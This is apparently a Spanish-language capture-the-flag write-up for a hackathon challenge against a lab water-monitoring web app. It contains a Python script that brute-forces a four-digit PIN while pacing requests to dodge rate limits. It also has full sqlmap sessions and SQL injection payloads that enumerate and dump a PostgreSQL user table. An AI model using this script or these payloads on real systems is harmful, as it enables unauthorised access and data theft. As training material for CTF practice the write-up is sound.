# Hackaton UdG - Reto 4

- [Flag 1](#flag-1)
- [Flag 2](#flag-2)

### Flag 1

Script en python para ir con un delay de segundo y poco ir probando con fuerza burta y sin forzar el límite de peticiones por segundo el PIN de entrada:

```python
import requests
import time

url_template = "http://10.60.0.1/api/check-pin/{pin}/"
headers = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0"
}

for pin in range(0, 10000):
    pin_str = f"{pin:04d}"
    url = url_template.format(pin=pin_str)
    payload = { "pin": pin_str }

    print(f"[~] Probando PIN: {pin_str}")
    response = requests.post(url, json=payload, headers=headers)

    if response.status_code != 401:
        print(f"[+] PIN encontrado: {pin_str}")
        print(f"Status: {response.status_code}")
        print(f"Body: {response.text}")
        break

    time.sleep(1.2) 
```
Dentro del panel `/dashboard` ya encontramos la flag.

**Flag 1:**: `HACK{2dtc01LWXqB0D21KdLPxwa5PZ}
`

### Flag 2

Empleamos la herramienta SQLMap depués de descubir que podemos llegar a la Base de Datos a través de un `GET` al endpoint `http://10.60.0.1/data/water/level/?water_source=main_tank
`

```python
                                                  
┌──(kali㉿kali)-[~/hackaton-udg/reto-4]
└─$ sqlmap -u "http://10.60.0.1/data/water/level/?water_source=main_tank" \
--cookie="csrftoken=RDpYYUlAvJYGRiH3Nysdit2dhIsfSfCx; sessionid=mr7kbezorxxigojefwds6m476hyeuxwd" \
--user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
--batch --risk=3 --level=5 --random-agent --technique=BEUST

        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.7#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:50:47 /2025-03-24/

Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:50:48] [INFO] testing connection to the target URL
[00:50:48] [INFO] checking if the target is protected by some kind of WAF/IPS
[00:50:49] [INFO] testing if the target URL content is stable
[00:50:49] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
[00:50:49] [INFO] testing if GET parameter 'water_source' is dynamic                                
[00:50:49] [INFO] GET parameter 'water_source' appears to be dynamic
[00:50:49] [WARNING] heuristic (basic) test shows that GET parameter 'water_source' might not be injectable
[00:50:49] [INFO] testing for SQL injection on GET parameter 'water_source'
[00:50:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'                        
[00:50:51] [INFO] GET parameter 'water_source' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[00:50:54] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'PostgreSQL'                              
it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y       
[00:50:54] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'                                             
[00:50:54] [INFO] GET parameter 'water_source' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable          
[00:50:54] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'                                                      
[00:51:05] [INFO] GET parameter 'water_source' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable        
[00:51:05] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'                                                           
[00:51:16] [INFO] GET parameter 'water_source' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable             
[00:51:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                    
[00:51:16] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:51:16] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[00:51:17] [WARNING] reflective value(s) found and filtering out
[00:51:17] [INFO] target URL appears to have 13 columns in query
[00:51:18] [INFO] GET parameter 'water_source' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                 
GET parameter 'water_source' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: water_source (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 5981=5981-- WCmE

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 7763=CAST((CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (7763=7763) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC)-- puBB

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: water_source=main_tank';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: water_source=main_tank' AND 5724=(SELECT 5724 FROM PG_SLEEP(5))-- ddMs

    Type: UNION query
    Title: Generic UNION query (NULL) - 13 columns
    Payload: water_source=main_tank' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(CHR(73)||CHR(109)||CHR(119)||CHR(81)||CHR(113)||CHR(116)||CHR(118)||CHR(116)||CHR(101)||CHR(122)||CHR(102)||CHR(101)||CHR(104)||CHR(71)||CHR(100)||CHR(109)||CHR(101)||CHR(102)||CHR(112)||CHR(71)||CHR(117)||CHR(83)||CHR(115)||CHR(115)||CHR(69)||CHR(65)||CHR(102)||CHR(120)||CHR(99)||CHR(66)||CHR(99)||CHR(100)||CHR(104)||CHR(98)||CHR(80)||CHR(83)||CHR(85)||CHR(67)||CHR(69)||CHR(73))||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)),NULL-- KYZl
---
[00:51:18] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx 1.20.1
back-end DBMS: PostgreSQL
[00:51:20] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 31 times
[00:51:20] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.60.0.1'                 
[00:51:20] [WARNING] your sqlmap version is outdated

[*] ending @ 00:51:20 /2025-03-24/

                                                              
┌──(kali㉿kali)-[~/hackaton-udg/reto-4]
└─$ sqlmap -u "http://10.60.0.1/data/water/level/?water_source=main_tank" \
--cookie="csrftoken=RDpYYUlAvJYGRiH3Nysdit2dhIsfSfCx; sessionid=mr7kbezorxxigojefwds6m476hyeuxwd" \
--dbs --batch --random-agent

        ___
       __H__                                                  
 ___ ___[(]_____ ___ ___  {1.8.7#stable}                      
|_ -| . ["]     | .'| . |                                     
|___|_  [)]_|_|_|__,|  _|                                     
      |_|V...       |_|   https://sqlmap.org                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:51:59 /2025-03-24/

[00:51:59] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.7 (.NET CLR 3.5.30729)' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                       
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:51:59] [INFO] resuming back-end DBMS 'postgresql' 
[00:51:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: water_source (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 5981=5981-- WCmE

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 7763=CAST((CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (7763=7763) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC)-- puBB

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: water_source=main_tank';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: water_source=main_tank' AND 5724=(SELECT 5724 FROM PG_SLEEP(5))-- ddMs

    Type: UNION query
    Title: Generic UNION query (NULL) - 13 columns
    Payload: water_source=main_tank' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(CHR(73)||CHR(109)||CHR(119)||CHR(81)||CHR(113)||CHR(116)||CHR(118)||CHR(116)||CHR(101)||CHR(122)||CHR(102)||CHR(101)||CHR(104)||CHR(71)||CHR(100)||CHR(109)||CHR(101)||CHR(102)||CHR(112)||CHR(71)||CHR(117)||CHR(83)||CHR(115)||CHR(115)||CHR(69)||CHR(65)||CHR(102)||CHR(120)||CHR(99)||CHR(66)||CHR(99)||CHR(100)||CHR(104)||CHR(98)||CHR(80)||CHR(83)||CHR(85)||CHR(67)||CHR(69)||CHR(73))||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)),NULL-- KYZl
---
[00:51:59] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx 1.20.1
back-end DBMS: PostgreSQL
[00:51:59] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
[00:51:59] [INFO] fetching database (schema) names
[00:52:00] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[00:52:00] [WARNING] the SQL query provided does not return any output
[00:52:00] [INFO] retrieved: 'public'
[00:52:01] [INFO] retrieved: 'pg_catalog'
[00:52:01] [INFO] retrieved: 'information_schema'
available databases [3]:
[*] information_schema
[*] pg_catalog
[*] public

[00:52:12] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 8 times
[00:52:12] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.60.0.1'                 
[00:52:12] [WARNING] your sqlmap version is outdated

[*] ending @ 00:52:12 /2025-03-24/

                                                              
┌──(kali㉿kali)-[~/hackaton-udg/reto-4]
└─$ sqlmap -u "http://10.60.0.1/data/water/level/?water_source=main_tank" \
--cookie="csrftoken=RDpYYUlAvJYGRiH3Nysdit2dhIsfSfCx; sessionid=mr7kbezorxxigojefwds6m476hyeuxwd" \
-D public --tables --batch --random-agent

        ___
       __H__                                                  
 ___ ___[,]_____ ___ ___  {1.8.7#stable}                      
|_ -| . ["]     | .'| . |                                     
|___|_  [,]_|_|_|__,|  _|                                     
      |_|V...       |_|   https://sqlmap.org                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:52:49 /2025-03-24/

[00:52:49] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.363.0 Safari/533.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'     
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:52:49] [INFO] resuming back-end DBMS 'postgresql' 
[00:52:49] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: water_source (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 5981=5981-- WCmE

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 7763=CAST((CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (7763=7763) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC)-- puBB

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: water_source=main_tank';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: water_source=main_tank' AND 5724=(SELECT 5724 FROM PG_SLEEP(5))-- ddMs

    Type: UNION query
    Title: Generic UNION query (NULL) - 13 columns
    Payload: water_source=main_tank' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(CHR(73)||CHR(109)||CHR(119)||CHR(81)||CHR(113)||CHR(116)||CHR(118)||CHR(116)||CHR(101)||CHR(122)||CHR(102)||CHR(101)||CHR(104)||CHR(71)||CHR(100)||CHR(109)||CHR(101)||CHR(102)||CHR(112)||CHR(71)||CHR(117)||CHR(83)||CHR(115)||CHR(115)||CHR(69)||CHR(65)||CHR(102)||CHR(120)||CHR(99)||CHR(66)||CHR(99)||CHR(100)||CHR(104)||CHR(98)||CHR(80)||CHR(83)||CHR(85)||CHR(67)||CHR(69)||CHR(73))||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)),NULL-- KYZl
---
[00:52:49] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx 1.20.1
back-end DBMS: PostgreSQL
[00:52:49] [INFO] fetching tables for database: 'public'
Database: public
[10 tables]
+----------------------------------+
| auth_group                       |
| auth_group_permissions           |
| auth_permission                  |
| challanges_user                  |
| challanges_user_groups           |
| challanges_user_user_permissions |
| django_admin_log                 |
| django_content_type              |
| django_migrations                |
| django_session                   |
+----------------------------------+

[00:52:49] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.60.0.1'                 
[00:52:49] [WARNING] your sqlmap version is outdated

[*] ending @ 00:52:49 /2025-03-24/

                                                              
┌──(kali㉿kali)-[~/hackaton-udg/reto-4]
└─$ sqlmap -u "http://10.60.0.1/data/water/level/?water_source=main_tank" \
--cookie="csrftoken=RDpYYUlAvJYGRiH3Nysdit2dhIsfSfCx; sessionid=mr7kbezorxxigojefwds6m476hyeuxwd" \
-D public -T challanges_user --columns --batch --random-agent

        ___
       __H__                                                  
 ___ ___[(]_____ ___ ___  {1.8.7#stable}                      
|_ -| . [']     | .'| . |                                     
|___|_  [.]_|_|_|__,|  _|                                     
      |_|V...       |_|   https://sqlmap.org                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:53:27 /2025-03-24/

[00:53:27] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009060310 Ubuntu/8.10 (intrepid) Firefox/3.0.11' from file '/usr/share/sqlmap/data/txt/user-agents.txt'                      
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:53:27] [INFO] resuming back-end DBMS 'postgresql' 
[00:53:27] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: water_source (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 5981=5981-- WCmE

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 7763=CAST((CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (7763=7763) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC)-- puBB

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: water_source=main_tank';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: water_source=main_tank' AND 5724=(SELECT 5724 FROM PG_SLEEP(5))-- ddMs

    Type: UNION query
    Title: Generic UNION query (NULL) - 13 columns
    Payload: water_source=main_tank' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(CHR(73)||CHR(109)||CHR(119)||CHR(81)||CHR(113)||CHR(116)||CHR(118)||CHR(116)||CHR(101)||CHR(122)||CHR(102)||CHR(101)||CHR(104)||CHR(71)||CHR(100)||CHR(109)||CHR(101)||CHR(102)||CHR(112)||CHR(71)||CHR(117)||CHR(83)||CHR(115)||CHR(115)||CHR(69)||CHR(65)||CHR(102)||CHR(120)||CHR(99)||CHR(66)||CHR(99)||CHR(100)||CHR(104)||CHR(98)||CHR(80)||CHR(83)||CHR(85)||CHR(67)||CHR(69)||CHR(73))||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)),NULL-- KYZl
---
[00:53:27] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx 1.20.1
back-end DBMS: PostgreSQL
[00:53:27] [INFO] fetching columns for table 'challanges_user' in database 'public'
Database: public
Table: challanges_user
[13 columns]
+-----------------------+-------------+
| Column                | Type        |
+-----------------------+-------------+
| date_joined           | timestamptz |
| email                 | varchar     |
| first_name            | varchar     |
| id                    | int8        |
| is_active             | bool        |
| is_staff              | bool        |
| is_superuser          | bool        |
| last_login            | timestamptz |
| last_name             | varchar     |
| password              | varchar     |
| password_backups_path | varchar     |
| username              | varchar     |
| water_source          | varchar     |
+-----------------------+-------------+

[00:53:27] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.60.0.1'                 
[00:53:27] [WARNING] your sqlmap version is outdated

[*] ending @ 00:53:27 /2025-03-24/

                                                              
┌──(kali㉿kali)-[~/hackaton-udg/reto-4]
└─$ sqlmap -u "http://10.60.0.1/data/water/level/?water_source=main_tank" \
--cookie="csrftoken=RDpYYUlAvJYGRiH3Nysdit2dhIsfSfCx; sessionid=mr7kbezorxxigojefwds6m476hyeuxwd" \
-D public -T challanges_user -C password_backups_path --dump --batch --random-agent

        ___
       __H__                                                  
 ___ ___[,]_____ ___ ___  {1.8.7#stable}                      
|_ -| . [(]     | .'| . |                                     
|___|_  [)]_|_|_|__,|  _|                                     
      |_|V...       |_|   https://sqlmap.org                  

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:54:15 /2025-03-24/

[00:54:15] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 6.0; tr-TR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
Cookie parameter 'csrftoken' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
[00:54:15] [INFO] resuming back-end DBMS 'postgresql' 
[00:54:15] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: water_source (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 5981=5981-- WCmE

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: water_source=main_tank' AND 7763=CAST((CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (7763=7763) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)) AS NUMERIC)-- puBB

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: water_source=main_tank';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: water_source=main_tank' AND 5724=(SELECT 5724 FROM PG_SLEEP(5))-- ddMs

    Type: UNION query
    Title: Generic UNION query (NULL) - 13 columns
    Payload: water_source=main_tank' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(CHR(113)||CHR(118)||CHR(122)||CHR(112)||CHR(113))||(CHR(73)||CHR(109)||CHR(119)||CHR(81)||CHR(113)||CHR(116)||CHR(118)||CHR(116)||CHR(101)||CHR(122)||CHR(102)||CHR(101)||CHR(104)||CHR(71)||CHR(100)||CHR(109)||CHR(101)||CHR(102)||CHR(112)||CHR(71)||CHR(117)||CHR(83)||CHR(115)||CHR(115)||CHR(69)||CHR(65)||CHR(102)||CHR(120)||CHR(99)||CHR(66)||CHR(99)||CHR(100)||CHR(104)||CHR(98)||CHR(80)||CHR(83)||CHR(85)||CHR(67)||CHR(69)||CHR(73))||(CHR(113)||CHR(120)||CHR(118)||CHR(118)||CHR(113)),NULL-- KYZl
---
[00:54:15] [INFO] the back-end DBMS is PostgreSQL
web application technology: Nginx 1.20.1
back-end DBMS: PostgreSQL
[00:54:15] [INFO] fetching entries of column(s) 'password_backups_path' for table 'challanges_user' in database 'public'    
Database: public
Table: challanges_user
[1 entry]
+---------------------------------+
| password_backups_path           |
+---------------------------------+
| HACK{6scoCxmUH3untGCMDbky4PzRw} |
+---------------------------------+

[00:54:16] [INFO] table 'public.challanges_user' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.60.0.1/dump/public/challanges_user.csv'                                     
[00:54:16] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.60.0.1'                 
[00:54:16] [WARNING] your sqlmap version is outdated

[*] ending @ 00:54:16 /2025-03-24/

                                                              
┌──(kali㉿kali)-[~/hackaton-udg/reto-4]
└─$ 

```

Arriba se aprecia todo el recorriedo de comandos para llegar dentro de la Base de Datos a la flag.

**Flag 2:** `HACK{6scoCxmUH3untGCMDbky4PzRw}` 
